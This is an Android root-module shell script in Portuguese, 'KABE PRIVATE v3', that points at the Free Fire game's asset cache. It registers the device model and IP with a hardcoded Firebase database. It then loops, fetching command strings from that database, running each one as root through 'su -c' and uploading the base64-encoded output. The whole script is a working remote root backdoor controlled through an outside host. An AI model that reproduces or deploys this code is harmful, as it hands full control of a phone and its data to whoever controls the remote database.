#!/system/bin/sh
# ═══════════════════════════════════════════════════════
#   KABE PRIVATE v3 — Via Firebase (igual remote_hs)
#   Funciona de qualquer lugar, sem servidor proprio
# ═══════════════════════════════════════════════════════

BASE_URL="https://khkh-38cba-default-rtdb.firebaseio.com"
MODULE_DIR="/data/adb/modules/kabe-firebase"
DATA_DIR="/data/adb/kabe"
KEY_FILE="$DATA_DIR/key"
CONFIG_FILE="$DATA_DIR/config"
LOG_FILE="$DATA_DIR/service.log"
PID_FILE="$DATA_DIR/service.pid"
HTTP_DIR="$DATA_DIR/www"
HTTP_PORT=9090
HTTPD_PID_FILE="$DATA_DIR/httpd.pid"

DEST="/data/user/0/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles"
GAME_FILE="cache_res.~2BrPJlgpDAnfyUCp~2Biox5bwsZlQQ~3D"

# === DIRETORIOS ===
mkdir -p "$DATA_DIR" 2>/dev/null
mkdir -p "$HTTP_DIR" 2>/dev/null
mkdir -p "$MODULE_DIR/logs" 2>/dev/null

# === MATAR PROCESSOS ANTIGOS ===
for pf in "$PID_FILE" "$HTTPD_PID_FILE"; do
    if [ -f "$pf" ]; then
        OLD=$(cat "$pf" 2>/dev/null)
        [ -n "$OLD" ] && kill -9 "$OLD" 2>/dev/null
    fi
done
pkill -f "busybox httpd" 2>/dev/null
sleep 1

echo $$ > "$PID_FILE"

# === FUNCOES ===
log() { echo "$(date '+[%H:%M:%S]') $1" >> "$LOG_FILE"; }

read_config() {
    [ -f "$CONFIG_FILE" ] && grep "^$1=" "$CONFIG_FILE" 2>/dev/null | sed "s/^$1=//"
}

# === GERAR KEY ===
if [ ! -f "$KEY_FILE" ]; then
    KEY="KABE-$(cat /proc/sys/kernel/random/uuid 2>/dev/null | tr -d '-' | head -c 8 | tr 'a-z' 'A-Z')"
    echo "$KEY" > "$KEY_FILE"
    chmod 600 "$KEY_FILE"
    log "Key gerada: $KEY"
fi

KEY=$(cat "$KEY_FILE" 2>/dev/null | tr -d '\n\r ')

# === DEVICE ===
DEVICE_ID=$(getprop ro.product.model 2>/dev/null)
[ -z "$DEVICE_ID" ] && DEVICE_ID="android"

PHONE_IP=""
for iface in wlan0 eth0 wlan1; do
    PHONE_IP=$(ip addr show "$iface" 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -n "$PHONE_IP" ] && break
done

log "════════════════════════════════════════"
log "KABE PRIVATE v3 | Key: $KEY"
log "Device: $DEVICE_ID | IP: $PHONE_IP"
log "════════════════════════════════════════"

# === INICIAR WEBUI ===
cp -f "$MODULE_DIR/webroot/index.html" "$HTTP_DIR/index.html" 2>/dev/null
busybox httpd -f -p "$HTTP_PORT" -h "$HTTP_DIR" &
HTTPD_PID=$!
echo "$HTTPD_PID" > "$HTTPD_PID_FILE"
log "WebUI em http://$PHONE_IP:$HTTP_PORT"

# === AGUARDAR INTERNET ===
until ping -c 1 -W 3 8.8.8.8 >/dev/null 2>&1; do sleep 5; done
log "Internet OK"

# === REGISTRAR NO FIREBASE ===
REG_DATA="{\"device\":\"$DEVICE_ID\",\"ip\":\"$PHONE_IP\",\"online\":true,\"lastSeen\":$(date +%s)000}"
curl -s --connect-timeout 5 -X PUT -d "$REG_DATA" "$BASE_URL/kabe/users/$KEY.json" > /dev/null 2>&1
log "Registrado no Firebase"

# === ESTADOS ===
LAST_CMD_ID=""

# === LOOP (poll a cada 2s, igual remote_hs) ===
while true; do
    # Sinal de parada
    if [ -f "$DATA_DIR/stop" ]; then
        rm -f "$DATA_DIR/stop"
        break
    fi

    # Heartbeat: atualizar lastSeen
    curl -s --connect-timeout 5 -X PATCH -d "{\"online\":true,\"lastSeen\":$(date +%s)000}" "$BASE_URL/kabe/users/$KEY.json" > /dev/null 2>&1

    # Buscar comandos pendentes
    CMDS=$(curl -s --connect-timeout 5 "$BASE_URL/kabe/users/$KEY/commands.json" 2>/dev/null)

    if [ -n "$CMDS" ] && [ "$CMDS" != "null" ] && [ "$CMDS" != "{}" ]; then
        # Para cada comando
        CMD_ID=$(echo "$CMDS" | grep -o '"id":"[^"]*"' | head -1 | cut -d'"' -f4)
        CMD_TEXT=$(echo "$CMDS" | grep -o '"cmd":"[^"]*"' | head -1 | cut -d'"' -f4)
        CMD_STATUS=$(echo "$CMDS" | grep -o '"status":"[^"]*"' | head -1 | cut -d'"' -f4)

        if [ -n "$CMD_TEXT" ] && [ -n "$CMD_ID" ] && [ "$CMD_ID" != "$LAST_CMD_ID" ] && [ "$CMD_STATUS" = "pending" ]; then
            LAST_CMD_ID="$CMD_ID"
            log "CMD: $CMD_TEXT"

            # Executar
            OUTPUT=$(su -c "$CMD_TEXT" 2>&1)
            EXIT_CODE=$?

            # Enviar resultado de volta pro Firebase
            OUTPUT_B64=$(echo "$OUTPUT" | base64 -w 0 2>/dev/null || echo "$OUTPUT" | base64 2>/dev/null)
            RESP_DATA="{\"output\":\"$OUTPUT_B64\",\"exit\":$EXIT_CODE,\"status\":\"done\"}"
            curl -s --connect-timeout 5 -X PATCH -d "$RESP_DATA" "$BASE_URL/kabe/users/$KEY/commands/$CMD_ID.json" > /dev/null 2>&1

            log "CMD done (exit=$EXIT_CODE)"
        fi
    fi

    sleep 2
done

# Cleanup
kill $HTTPD_PID 2>/dev/null
rm -f "$PID_FILE" "$HTTPD_PID_FILE"
log "Parado"
